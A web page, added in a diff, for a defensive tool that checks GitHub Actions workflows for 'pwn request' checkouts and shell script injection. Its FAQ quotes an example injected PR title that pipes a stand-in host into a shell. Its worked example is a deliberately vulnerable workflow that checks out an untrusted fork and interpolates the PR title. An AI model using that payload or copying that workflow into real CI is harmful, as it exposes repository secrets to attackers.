@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="../favicon.ico" sizes="16x16">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>GitHub Actions Injection Check — Pwn Requests &amp; Script Injection</title>
+  <meta name="description" content="Paste your GitHub Actions workflow YAML and find pull_request_target/workflow_run 'pwn request' checkouts and shell script-injection from untrusted ${{…">
+  <meta property="og:title" content="Is your GitHub Actions workflow open to a pwn request or script injection?">
+  <meta property="og:description" content="Paste your workflow YAML and get every pull_request_target/workflow_run checkout of an untrusted ref, and every run…">
+  <link rel="canonical" href="https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/">
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"SoftwareApplication","name":"GitHub Actions Injection Check","applicationCategory":"DeveloperApplication","operatingSystem":"Any modern browser; CLI needs Python 3, no dependencies","offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"description":"Scans GitHub Actions workflow YAML for pull_request_target/workflow_run 'pwn request' checkouts of untrusted refs, and run: steps that interpolate untrusted ${{ github.event.* }} expressions (script injection). Runs entirely in the browser or as a zero-dependency CLI; nothing is uploaded and it makes no network calls of its own."}
+  </script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"What is a \"pwn request\" in GitHub Actions?","acceptedAnswer":{"@type":"Answer","text":"A workflow triggered by pull_request_target or workflow_run runs with the base repository's secrets and a privileged GITHUB_TOKEN, even though the event itself was raised by a stranger's fork. If a step in that workflow checks out the untrusted head (for example ref: ${{ github.event.pull_request.head.sha }}) and a later step builds, tests, or otherwise executes that code, the fork's code runs with your secrets. GitHub's own security guidance documents this at length, and actions/checkout v7 (June 2026) started refusing the common form of it by default."}},{"@type":"Question","name":"What is script injection in a run: step?","acceptedAnswer":{"@type":"Answer","text":"When a run: step interpolates ${{ github.event.pull_request.title }} (or another untrusted context value) directly into a shell command, the value is spliced into the script text before the shell ever sees it as data — not passed as a string. Since a PR title, issue body, or branch name is content a stranger fully controls, a title like \"; curl evil.example | sh #\" runs as a second command. GitHub's guidance names the fix: pass the value through a step env: var and reference it as a quoted shell variable instead."}},{"@type":"Question","name":"Does this tool fetch anything from GitHub for me?","acceptedAnswer":{"@type":"Answer","text":"No. It makes no network calls at all — nothing here can, because nothing here talks to a server. Paste your workflow YAML and the scan runs entirely in this page."}},{"@type":"Question","name":"Does a clean scan mean my workflows are secure?","acceptedAnswer":{"@type":"Answer","text":"No. This checks two specific, well-documented patterns. It is not a security audit and makes no claim about your workflows' overall security. Both patterns have variants this tool does not attempt to catch — a hand-rolled git checkout instead of actions/checkout, or an expression built in an unusual way."}},{"@type":"Question","name":"Why does script injection get flagged regardless of trigger type?","acceptedAnswer":{"@type":"Answer","text":"Unlike the pwn-request checkout risk, script injection into a shell is dangerous on any trigger a stranger can influence — pull_request, issues, issue_comment — not just the two privileged triggers. A workflow token with even minimal permissions, or a runner with network access, is enough for an injected command to do damage."}}]}</script>
+  <style>
+    :root { font: 16px system-ui, sans-serif; color: #1b1f2a; background: #f2f4f7; }
+    body { max-width: 1000px; margin: auto; padding: 28px; }
+    h1 { font-size: clamp(1.7rem, 4.6vw, 2.7rem); line-height: 1.08; margin: 0 0 14px; color: #17324a; }
+    h2 { font-size: 1.15rem; margin: 0 0 10px; color: #17324a; }
+    h3 { font-size: 1rem; margin: 18px 0 4px; }
+    p, li { line-height: 1.55; }
+    .note, footer { font-size: .86rem; color: #55606f; }
+    .card { background: #fff; border: 1px solid #d5dbe3; border-radius: 14px; padding: 22px; box-shadow: 0 8px 24px #17324a10; margin: 18px 0; }
+    textarea { width: 100%; min-height: 150px; box-sizing: border-box; padding: 10px; border: 1px solid #a8b3c1; border-radius: 7px; font: 13px ui-monospace, monospace; }
+    input[type=text] { width: 100%; box-sizing: border-box; padding: 7px 9px; border: 1px solid #a8b3c1; border-radius: 7px; font: 13px ui-monospace, monospace; margin-bottom: 6px; }
+    button { border: 0; border-radius: 8px; padding: 11px 15px; background: #9a3412; color: #fff; font-weight: 700; cursor: pointer; margin: 0 8px 8px 0; }
+    button.secondary { background: #e3e9ef; color: #17324a; }
+    button.small { padding: 6px 10px; font-size: .8rem; font-weight: 600; }
+    .file-block { border: 1px solid #e6eaf0; border-radius: 10px; padding: 12px; margin-bottom: 12px; }
+    .file-block-head { display: flex; gap: 8px; align-items: center; margin-bottom: 6px; }
+    .file-block-head input { margin-bottom: 0; }
+    .verdict { font-size: 1.35rem; font-weight: 800; margin: 0 0 6px; color: #14532d; }
+    .verdict.risk { color: #9a3412; }
+    table { width: 100%; border-collapse: collapse; font-size: .88rem; }
+    th, td { text-align: left; padding: 8px 6px; border-bottom: 1px solid #e6eaf0; vertical-align: top; }
+    th { color: #55606f; font-size: .78rem; text-transform: uppercase; letter-spacing: .04em; }
+    .pill { display: inline-block; font-size: .72rem; font-weight: 700; letter-spacing: .04em; text-transform: uppercase; padding: 3px 8px; border-radius: 999px; }
+    .pill.pwn-request-checkout { background: #fde8e8; color: #9a3412; }
+    .pill.script-injection { background: #fef3c7; color: #92400e; }
+    pre.cmd { background: #f7f9fb; padding: 12px; border-radius: 8px; font-size: .88rem; line-height: 1.6; overflow-x: auto; }
+    code { overflow-wrap: anywhere; word-break: break-word; }
+    .error { color: #9a3412; font-weight: 600; }
+    footer { margin-top: 28px; border-top: 1px solid #d5dbe3; padding-top: 16px; }
+    .tableWrap { overflow-x: auto; }
+  </style>
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Open Tools and Research","item":"https://duncan-haywood.github.io/monorepo-projects/"},{"@type":"ListItem","position":2,"name":"Is your GitHub Actions workflow open to a pwn request or script injection?","item":"https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/"}]}</script>
+<link rel="stylesheet" href="../pf-chrome.css">
+
+<meta property="og:url" content="https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Open Tools and Research">
+<meta property="og:image" content="https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/share-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Is your GitHub Actions workflow open to a pwn request or script injection? — Open Tools and Research">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="stylesheet" href="../pf-embed.css">
+  <link rel="manifest" href="../manifest.webmanifest">
+  <meta name="theme-color" content="#12594a">
+  <link rel="apple-touch-icon" href="../icon-192.png">
+  <!-- The build also emits /favicon.ico, which is what a browser fetches with
+       no markup to go on; a linked PNG is preferred where both exist and is
+       the one that stays sharp on a high-DPI tab strip. -->
+  <link rel="icon" type="image/png" href="../icon-192.png">
+  <script>
+    // Progressive enhancement only: with no service worker support, or with the
+    // registration rejected (private mode, an unsupported browser), every page
+    // behaves exactly as it did before.
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('../sw.js').catch(() => {});
+      });
+    }
+  </script>
+</head>
+<body>
+<nav class="pf-chrome pf-chrome-top" aria-label="Site" data-pfs-head><span class="pfs-bar"><a class="pfs-brand" href="../" data-pf-to="hub"><span class="pfs-mark" aria-hidden="true"></span>Open Tools and Research</a><span class="pfs-nav"><a data-pfs-nav="tools" href="../c/" aria-current="page">Tools</a><a data-pfs-nav="research" href="../research/">Research</a><a data-pfs-nav="writing" href="../writing/">Writing</a><a data-pfs-nav="deploy" href="../deploy/">Deploy your own</a><a data-pfs-nav="about" href="../about/">About</a></span><a class="pfs-searchlink pfs-always" href="../#search">Search</a></span><span class="pfs-crumbs" role="group" aria-label="Breadcrumb"><a href="../" data-pf-to="hub">Home</a><span class="pfs-sep" aria-hidden="true">›</span><a href="../c/ci/">CI checks &amp; developer gates</a><span class="pfs-sep" aria-hidden="true">›</span><span aria-current="page">Is your GitHub Actions workflow open to a pwn request or script injection?</span></span></nav>
+  <header>
+    <p class="note">ACTIONS INJECTION CHECK · RUNS IN YOUR BROWSER</p>
+    <h1>Is your GitHub Actions workflow open to a pwn request or script injection?</h1>
+    <p>A workflow triggered by <code>pull_request_target</code> or <code>workflow_run</code> runs with your secrets even though a stranger's fork raised the event. If it checks out that fork's code, the fork's code runs with your secrets — a <strong>pwn request</strong>. And any <code>run:</code> step that drops <code>${{ github.event.pull_request.title }}</code> (or another attacker-controlled value) straight into a shell command hands that stranger a shell — <strong>script injection</strong>. Paste your workflow YAML below and this page finds both, each with the exact fix.</p>
+    <p class="note">Nothing is uploaded. The YAML you paste is read in this browser and never leaves your device, and this tool makes no network calls of its own.</p>
+  </header>
+
+  <section class="card">
+    <h2>1. Paste one or more workflow files</h2>
+    <p class="note">Copy the contents of each file under <code>.github/workflows/</code> you want checked. Add more blocks for more files — nothing here reads your repository, so pasting is how it sees anything.</p>
+    <div id="files"></div>
+    <p>
+      <button type="button" class="secondary small" id="add-file">+ Add another workflow file</button>
+    </p>
+    <p>
+      <button type="button" id="check">Check</button>
+      <button type="button" class="secondary" id="load-example">Load worked example</button>
+      <button type="button" class="secondary" id="clear">Clear</button>
+    </p>
+    <p class="note" id="status">Paste at least one workflow file above and click Check.</p>
+  </section>
+
+  <section class="card" id="report-card" aria-live="polite" hidden>
+    <h2>Findings</h2>
+    <p class="verdict" id="verdict"></p>
+    <div class="tableWrap">
+      <div class="pf-table-scroll"><table>
+        <thead><tr><th>File : Line</th><th>Type</th><th>Detail</th><th>Fix</th></tr></thead>
+        <tbody id="rows"></tbody>
+      </table></div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>Prefer a CLI, or want this in your own CI?</h2>
+    <p>Same logic, zero dependencies, one file:</p>
+    <pre class="cmd"><code>python3 check.py                  # scan .github/workflows under the current directory
+python3 check.py /path/to/repo    # scan a specific checkout
+python3 check.py --format json    # machine-readable
+python3 check.py --fail-on-risk   # exit 2 if any finding exists</code></pre>
+    <p class="note">Get <a href="check.py" rel="noopener">check.py from the repo</a> — stdlib only, nothing to install, no network calls. Wire <code>--fail-on-risk</code> into your own CI to block a newly-added finding before it merges.</p>
+  </section>
+
+  <section class="card">
+    <h2>Common questions</h2>
+    <h3>What is a "pwn request" in GitHub Actions?</h3>
+    <p>A workflow triggered by <code>pull_request_target</code> or <code>workflow_run</code> runs with the base repository's secrets and a privileged <code>GITHUB_TOKEN</code>, even though the event itself was raised by a stranger's fork. If a step in that workflow checks out the untrusted head (for example <code>ref: ${{ github.event.pull_request.head.sha }}</code>) and a later step builds, tests, or otherwise executes that code, the fork's code runs with your secrets. GitHub's own security guidance documents this at length, and <code>actions/checkout</code> v7 (June 2026) started refusing the common form of it by default.</p>
+    <h3>What is script injection in a <code>run:</code> step?</h3>
+    <p>When a <code>run:</code> step interpolates <code>${{ github.event.pull_request.title }}</code> (or another untrusted context value) directly into a shell command, the value is spliced into the script text before the shell ever sees it as data — not passed as a string. Since a PR title, issue body, or branch name is content a stranger fully controls, a title like <code>"; curl evil.example | sh #"</code> runs as a second command. GitHub's guidance names the fix: pass the value through a step <code>env:</code> var and reference it as a quoted shell variable instead.</p>
+    <h3>Does this tool fetch anything from GitHub for me?</h3>
+    <p>No. It makes no network calls at all — nothing here can, because nothing here talks to a server. Paste your workflow YAML and the scan runs entirely in this page.</p>
+    <h3>Does a clean scan mean my workflows are secure?</h3>
+    <p>No. This checks two specific, well-documented patterns. It is not a security audit and makes no claim about your workflows' overall security. Both patterns have variants this tool does not attempt to catch — a hand-rolled <code>git checkout</code> instead of <code>actions/checkout</code>, or an expression built in an unusual way.</p>
+    <h3>Why does script injection get flagged regardless of trigger type?</h3>
+    <p>Unlike the pwn-request checkout risk, script injection into a shell is dangerous on any trigger a stranger can influence — <code>pull_request</code>, <code>issues</code>, <code>issue_comment</code> — not just the two privileged triggers. A workflow token with even minimal permissions, or a runner with network access, is enough for an injected command to do damage.</p>
+    <p>More: <a href="what-is-a-pwn-request-in-github-actions.html">what is a pwn request in GitHub Actions?</a> Already run <a href="vs-zizmor.html">zizmor</a>? See <a href="vs-zizmor.html">how this checker compares</a> for the injection question specifically. Prefer to just read the file? See <a href="vs-checking-a-workflow-by-hand.html">this checker vs. reading a workflow by hand</a>.</p>
+  </section>
+
+  <footer>
+    <p><strong>No warranty.</strong> This tool is provided free and as-is, without warranty of any kind, express or implied. It is not a security audit, a compliance attestation, or a guarantee that your CI is safe from injection attacks, and it does not replace a qualified professional. <strong>You are responsible for reviewing and verifying its output before relying on it.</strong> To the maximum extent permitted by law, the authors accept no liability for any loss or damage arising from its use.</p>
+    <p><strong>Best-effort hosting, no SLA.</strong> These tools are free, experimental, and may be slow, broken, moved, or taken offline without notice. We do not promise uptime, backups of anything you type, or that a URL will keep working. Do not use this as a system of record. If a tool needs to survive, get <a href="check.py" rel="noopener">check.py from the repo</a> and run it yourself.</p>
+    <p>Everything runs in your browser. The YAML you paste is never uploaded; there are no accounts, cookies, or analytics vendors, and the tool makes no network calls. Anonymous feature events (<code>check_run</code>, <code>example_loaded</code>) are counted only in local storage and can be deleted with the button below. Do Not Track and Global Privacy Control are honoured.</p>
+    <p><button type="button" class="secondary" id="optout">Turn usage counting off</button></p>
+    <p>Also worth a pass over your workflows: <a href="../pinned-actions-check/">Pinned Actions Check</a> flags third-party <code>uses:</code> lines referenced by a mutable tag instead of a pinned commit SHA, <a href="../actions-permissions-check/">Actions Permissions Check</a> flags workflows and jobs with no explicit <code>permissions:</code> grant or with <code>write-all</code>, <a href="../actions-cache-poisoning-check/">Actions Cache Poisoning Check</a> flags an <code>actions/cache</code> write reachable from a fork trigger or an unscoped <code>restore-keys</code> fallback, and <a href="../actions-secret-leak-check/">Actions Secret Leak Check</a> flags a step that transforms a secret before it can be masked, or exports one to <code>$GITHUB_ENV</code>/<code>$GITHUB_OUTPUT</code> without <code>::add-mask::</code> — four more slices of a hardened CI setup. And your dependencies, not just your workflows: <a href="../license-drift-check/">License Drift Check</a> flags a package whose license changed since your last snapshot, the change Dependabot and Renovate don't. And beyond your workflows and dependencies, your own API: <a href="../cors-misconfig-check/">CORS Misconfiguration Checker</a> sends real requests with crafted Origin headers and names the exact response header behind a reflected-origin, null-origin, or unanchored allow-list bypass -- the same "read what's actually there, name the exact evidence" shape, for a live HTTP response instead of a workflow file.</p>
+    <p>Want this check and 21 others in one pass? <a href="../devsec-toolkit/">devsec-toolkit</a> runs it alongside the rest of the portfolio's devsec checks (GitHub Actions, Docker, Compose, Kubernetes, supply chain, code, AI-agent configs) over a whole repository, with one report, SARIF for code scanning and a baseline so CI fails only on new findings.</p>
+    <p class="support">Free and open source. If this saved you from shipping an injection hole, the <a href="LICENSE" rel="noopener">code is under an MIT licence</a> — <a href="https://github.com/sponsors/Duncan-Haywood" rel="noopener" data-pf-sponsor>support</a> is entirely optional and never changes what the tool does.</p>
+  </footer>
+
+  <script type="module">
+    import { scanFiles, hasRisk, summaryLine, PWN_REQUEST_CHECKOUT, SCRIPT_INJECTION } from "./classify.mjs";
+    import { record, setUsageOptOut, usageOptedOut } from "./usage.mjs";
+
+    const $ = (sel) => document.querySelector(sel);
+    const els = {
+      files: $("#files"), status: $("#status"), reportCard: $("#report-card"),
+      verdict: $("#verdict"), rows: $("#rows"),
+    };
+
+    const EXAMPLE = [
+      {
+        name: ".github/workflows/pr-comment.yml",
+        text: `name: pr-comment
+on:
+  pull_request_target:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}
+      - run: npm ci && npm test
+      - run: echo "Thanks for the PR titled \${{ github.event.pull_request.title }}"
+`,
+      },
+    ];
+
+    function escapeHtml(s) {
+      return String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+    }
+
+    function fileBlock(name = "", text = "") {
+      const wrap = document.createElement("div");
+      wrap.className = "file-block";
+      wrap.innerHTML = `
+        <div class="file-block-head">
+          <input type="text" class="fname" placeholder=".github/workflows/ci.yml" value="${escapeHtml(name)}">
+          <button type="button" class="secondary small remove-file">Remove</button>
+        </div>
+        <textarea class="ftext" spellcheck="false" placeholder="Paste the workflow YAML here"></textarea>
+      `;
+      wrap.querySelector(".ftext").value = text;
+      wrap.querySelector(".remove-file").addEventListener("click", () => {
+        if (els.files.children.length > 1) wrap.remove();
+      });
+      return wrap;
+    }
+
+    function addFile(name = "", text = "") {
+      els.files.appendChild(fileBlock(name, text));
+    }
+
+    function collectFiles() {
+      return [...els.files.querySelectorAll(".file-block")]
+        .map((block, i) => ({
+          name: block.querySelector(".fname").value.trim() || `workflow-${i + 1}.yml`,
+          text: block.querySelector(".ftext").value,
+        }))
+        .filter((f) => f.text.trim().length > 0);
+    }
+
+    function renderRows(findings) {
+      els.rows.innerHTML = findings.map((f) => {
+        return `
+        <tr>
+          <td><code>${escapeHtml(f.file)}:${f.line}</code></td>
+          <td><span class="pill ${f.type}">${f.type}</span></td>
+          <td><code>${escapeHtml(f.detail ?? "")}</code></td>
+          <td>${escapeHtml(f.remediation ?? "")}</td>
+        </tr>`;
+      }).join("");
+    }
+
+    function runCheck(files) {
+      if (!files.length) {
+        els.status.innerHTML = `<span class="error">Paste at least one workflow file first.</span>`;
+        return;
+      }
+      let findings;
+      try {
+        findings = scanFiles(files);
+      } catch (err) {
+        els.status.innerHTML = `<span class="error">${escapeHtml(err.message)}</span>`;
+        els.reportCard.hidden = true;
+        return;
+      }
+      const risk = hasRisk(findings);
+      els.verdict.className = `verdict ${risk ? "risk" : ""}`;
+      els.verdict.textContent = summaryLine(findings);
+      renderRows(findings);
+      els.reportCard.hidden = false;
+      els.status.textContent = "";
+      record("check_run");
+      els.reportCard.scrollIntoView({ behavior: "smooth", block: "start" });
+    }
+
+    $("#add-file").addEventListener("click", () => addFile());
+    $("#check").addEventListener("click", () => runCheck(collectFiles()));
+
+    $("#load-example").addEventListener("click", () => {
+      els.files.innerHTML = "";
+      for (const f of EXAMPLE) addFile(f.name, f.text);
+      runCheck(EXAMPLE);
+      record("example_loaded");
+      els.status.textContent = "Worked example: an untrusted checkout ref under pull_request_target, plus a run: step that interpolates the PR title directly.";
+    });
+
+    $("#clear").addEventListener("click", () => {
+      els.files.innerHTML = "";
+      addFile();
+      els.reportCard.hidden = true;
+      els.status.textContent = "Paste at least one workflow file above and click Check.";
+    });
+
+    $("#optout").addEventListener("click", (event) => {
+      setUsageOptOut(true);
+      event.target.textContent = "Usage counting is off";
+      event.target.disabled = true;
+    });
+
+    addFile();
+
+    // Show the choice the visitor already made. Counting really is off --
+    // the module remembers it (#4657) -- but the button came back saying
+    // "turn counting off", which tells the visitor their click did not
+    // take. A control that appears not to have worked is one the visitor
+    // clicks again, or stops believing.
+    if (usageOptedOut()) {
+      const usageControl = document.getElementById('optout');
+      if (usageControl) {
+        usageControl.textContent = "Usage counting is off";
+        usageControl.disabled = true;
+      }
+    }
+  </script>
+<aside class="pf-chrome pf-chrome-foot" aria-label="More free tools">
+  <div class="pf-inner">
+    <h2>More free tools</h2>
+    <p>Free and private, like this one — everything runs in your browser, and nothing you type is uploaded.</p>
+    <ul>
+      <li><a href="../ai-crawler-access-check/" data-pf-to="ai-crawler-access-check">Which AI crawlers can actually read your site?</a></li>
+      <li><a href="../android-data-safety-check/" data-pf-to="android-data-safety-check">Android Data Safety Checker</a></li>
+      <li><a href="../app-listing-metadata-check/" data-pf-to="app-listing-metadata-check">App Store &amp; Google Play Listing Checker</a></li>
+      <li><a href="../app-store-commission-calculator/" data-pf-to="app-store-commission-calculator">What does the App Store really cost you versus web checkout?</a></li>
+    </ul>
+    <p>
+      <a href="../" data-pf-to="hub">Browse all 1279 free tools →</a>
+      &nbsp;·&nbsp;
+      <a href="../about/">About &amp; privacy</a>
+      &nbsp;·&nbsp;
+      <a href="../deploy/?app=actions-injection-check">Run your own copy</a>
+      &nbsp;·&nbsp;
+      <a href="https://github.com/sponsors/Duncan-Haywood" data-pf-sponsor>Sponsoring on GitHub</a>
+      is optional and changes nothing about what these tools do.
+    </p>
+  </div>
+    <details class="pf-chrome pf-embed-offer">
+      <summary>Embed this tool on your page</summary>
+      <p>Free to use on your own site — the calculator runs in the visitor's browser, computes nothing on our servers, and adds no tracking of any kind to your page. It keeps the same arithmetic and the same disclaimer as the page you are looking at now, and links back here for anyone who wants the full tool.</p>
+      <textarea readonly rows="4" aria-label="Embed code" data-pf-embed-snippet>&lt;iframe src=&quot;https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/?pfEmbed=1&quot; title=&quot;Is your GitHub Actions workflow open to a pwn request or script injection? — free calculator, opens the full tool in a new tab&quot; style=&quot;width:100%;max-width:820px;border:0;min-height:1400px&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;
+&lt;script src=&quot;https://duncan-haywood.github.io/pf-embed-host.js&quot; async&gt;&lt;/script&gt;</textarea>
+      <p class="pf-embed-actions">
+        <button type="button" data-pf-embed-copy>Copy embed code</button>
+        <span data-pf-embed-status role="status"></span>
+      </p>
+      <p class="pf-embed-note">The second line sizes the frame to the tool, so it never scrolls inside your page or leaves a gap below it. It listens for one number from this frame and does nothing else — no cookies, no tracking, nothing read from your page. Leave it out and the embed still works at a fixed 1400px.</p>
+    </details>
+  </aside>
+<script src="../pf-site.js" data-pf-slug="actions-injection-check"></script>
+<script type="module" src="../pf-embed.js" data-pf-embed-url="https://duncan-haywood.github.io/monorepo-projects/actions-injection-check/" data-pf-embed-title="Is your GitHub Actions workflow open to a pwn request or script injection?" data-pf-embed-slug="actions-injection-check"></script>
+</body>
+</html>
